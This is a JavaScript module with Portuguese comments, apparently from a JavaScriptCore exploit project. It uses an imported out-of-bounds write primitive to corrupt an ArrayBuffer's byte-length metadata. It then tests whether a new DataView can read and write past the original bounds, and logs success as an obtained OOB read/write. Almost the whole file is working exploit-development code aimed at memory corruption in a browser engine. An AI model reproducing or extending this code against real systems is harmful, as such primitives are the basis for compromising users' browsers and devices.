// js/script3/testCorruptMetadata.mjs (Nome do arquivo alterado para refletir o novo foco)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs'; // isAdvancedInt64Object removido se não usado
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export async function executeCorruptArrayBufferMetadataTest(
    testDescription,
    offsetToCorrupt, // Ex: JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START
    valueToWrite,    // Ex: 0x7FFFFFFF
    bytesToWrite      // Ex: 4 para tamanho, 8 para ponteiro se 64-bit
) {
    const FNAME_TEST = `executeCorruptMetadata<${testDescription}>`;

    logS3(`--- Iniciando Teste de Corrupção de Metadados AB: ${testDescription} ---`, "test", FNAME_TEST);
    logS3(`   Alvo Offset (rel. início oob_array_buffer_real): ${toHex(offsetToCorrupt)}, Valor: ${toHex(valueToWrite)}, Bytes: ${bytesToWrite}`, "info", FNAME_TEST);
    document.title = `Iniciando CorruptMetadata: ${testDescription}`;

    const originalVictimBufferSize = 64; // Tamanho de um buffer de vítima para referência, se necessário, ou o próprio oob_array_buffer_real.
                                       // Para este teste, o oob_array_buffer_real é a vítima principal.

    await triggerOOB_primitive(); // Configura oob_array_buffer_real e oob_dataview_real
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
        document.title = "ERRO: Falha OOB Setup";
        return { corruptionSucceeded: false, details: "OOB Setup Failed" };
    }
    document.title = "OOB Configurado";

    const initialOOBArrayBufferByteLength = oob_array_buffer_real.byteLength;
    logS3(`Tamanho inicial de oob_array_buffer_real: ${initialOOBArrayBufferByteLength} bytes (${toHex(initialOOBArrayBufferByteLength)})`, "info", FNAME_TEST);

    let stepReached = "antes_escrita_oob";
    let corruptionAttempted = false;
    let postCorruptionCheck = {
        newByteLength: "N/A",
        readBeyondOriginal: "Não tentado",
        writeBeyondOriginal: "Não tentado"
    };

    try {
        if (offsetToCorrupt >= 0 && offsetToCorrupt + bytesToWrite <= initialOOBArrayBufferByteLength) {
            logS3(`CORRUPÇÃO: Escrevendo valor ${typeof valueToWrite === 'object' ? valueToWrite.toString(true) : toHex(valueToWrite)} (${bytesToWrite} bytes) em offset abs ${toHex(offsetToCorrupt)} do oob_array_buffer_real`, "warn", FNAME_TEST);
            stepReached = "antes_escrita_oob";
            document.title = `Antes Escrita OOB Metadata: ${testDescription}`;
            
            oob_write_absolute(offsetToCorrupt, valueToWrite, bytesToWrite);
            corruptionAttempted = true;
            logS3("Escrita OOB de metadados realizada.", "info", FNAME_TEST);
            stepReached = "apos_escrita_oob";
            document.title = `Após Escrita OOB Metadata: ${testDescription}`;
        } else {
            logS3(`AVISO: Offset de corrupção de metadados ${toHex(offsetToCorrupt)} inválido para o tamanho ${initialOOBArrayBufferByteLength}. Escrita não realizada.`, "warn", FNAME_TEST);
            stepReached = "escrita_oob_pulada_offset_invalido";
            document.title = `Escrita OOB Pulada (Offset Inválido): ${testDescription}`;
        }

        await PAUSE_S3(SHORT_PAUSE_S3);

        if (corruptionAttempted) {
            postCorruptionCheck.newByteLength = oob_array_buffer_real.byteLength;
            logS3(`Tamanho de oob_array_buffer_real APÓS corrupção: ${postCorruptionCheck.newByteLength} bytes (${toHex(postCorruptionCheck.newByteLength)})`, "leak", FNAME_TEST);
            if (postCorruptionCheck.newByteLength !== initialOOBArrayBufferByteLength) {
                logS3("!!! SUCESSO ESPECULATIVO: oob_array_buffer_real.byteLength FOI ALTERADO !!!", "vuln", FNAME_TEST);
                document.title = `SUCESSO: Tamanho AB Alterado! - ${testDescription}`;
            } else {
                logS3("Tamanho de oob_array_buffer_real NÃO foi alterado pela escrita.", "info", FNAME_TEST);
            }

            // Tentar usar uma nova DataView com o buffer potencialmente corrompido
            try {
                logS3("Criando nova DataView sobre o oob_array_buffer_real (potencialmente) corrompido...", "info", FNAME_TEST);
                const corruptedView = new DataView(oob_array_buffer_real);
                logS3(`Nova DataView criada. Comprimento da view (baseado no novo tamanho do buffer): ${corruptedView.byteLength}`, "info", FNAME_TEST);

                const testOffsetBeyondOriginal = initialOOBArrayBufferByteLength + 4; // Ex: 4 bytes além do fim original
                const testValue = 0xABABABAB;

                if (postCorruptionCheck.newByteLength > initialOOBArrayBufferByteLength && testOffsetBeyondOriginal + 4 <= postCorruptionCheck.newByteLength) {
                    logS3(`Tentando escrever ${toHex(testValue)} em offset ${toHex(testOffsetBeyondOriginal)} (além do original) usando nova DataView...`, "warn", FNAME_TEST);
                    corruptedView.setUint32(testOffsetBeyondOriginal, testValue, true);
                    postCorruptionCheck.writeBeyondOriginal = `Escrito ${toHex(testValue)} em ${toHex(testOffsetBeyondOriginal)}`;
                    
                    let readBack = corruptedView.getUint32(testOffsetBeyondOriginal, true);
                    postCorruptionCheck.readBeyondOriginal = `Lido ${toHex(readBack)} de ${toHex(testOffsetBeyondOriginal)}`;
                    if (readBack === testValue) {
                        logS3(`!!! SUCESSO DE LEITURA/ESCRITA ALÉM DOS LIMITES !!! Leu ${toHex(readBack)}`, "critical", FNAME_TEST);
                        document.title = `R/W OOB OBTIDO! - ${testDescription}`;
                    } else {
                        logS3(`Falha na verificação de R/W além dos limites. Lido: ${toHex(readBack)}, Esperado: ${toHex(testValue)}`, "error", FNAME_TEST);
                    }
                } else {
                    logS3("Novo tamanho do buffer não é grande o suficiente para teste R/W além dos limites, ou não mudou.", "info", FNAME_TEST);
                    postCorruptionCheck.readBeyondOriginal = "Não aplicável (tamanho insuficiente)";
                    postCorruptionCheck.writeBeyondOriginal = "Não aplicável (tamanho insuficiente)";
                }
            } catch (e_view) {
                logS3(`ERRO ao usar nova DataView ou R/W além dos limites: ${e_view.message}`, "error", FNAME_TEST);
                document.title = `ERRO Nova DataView: ${testDescription}`;
                postCorruptionCheck.readBeyondOriginal = `Erro: ${e_view.message}`;
                postCorruptionCheck.writeBeyondOriginal = `Erro: ${e_view.message}`;
            }
        }

    } catch (mainError) {
        stepReached = "erro_principal";
        document.title = `ERRO Principal CorruptMetadata: ${testDescription}`;
        logS3(`Erro principal no teste de corrupção de metadados (${testDescription}): ${mainError.message}`, "error", FNAME_TEST);
        console.error(mainError);
    } finally {
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo alcançado: ${stepReached}`, "info", FNAME_TEST);
    }
    logS3(`--- Teste de Corrupção de Metadados AB Concluído: ${testDescription} ---`, "test", FNAME_TEST);
    logS3(`   Detalhes Pós-Corrupção: Novo Tamanho=${postCorruptionCheck.newByteLength}, Escrita OOB="${postCorruptionCheck.writeBeyondOriginal}", Leitura OOB="${postCorruptionCheck.readBeyondOriginal}"`, "info", FNAME_TEST);
    
    if (document.title.startsWith("Iniciando") || document.title.startsWith("OOB Configurado") || document.title.startsWith("Antes Escrita OOB") || document.title.startsWith("Após Escrita OOB")) {
        document.title = `Teste Concluído Metadata: ${testDescription}`;
    }
}
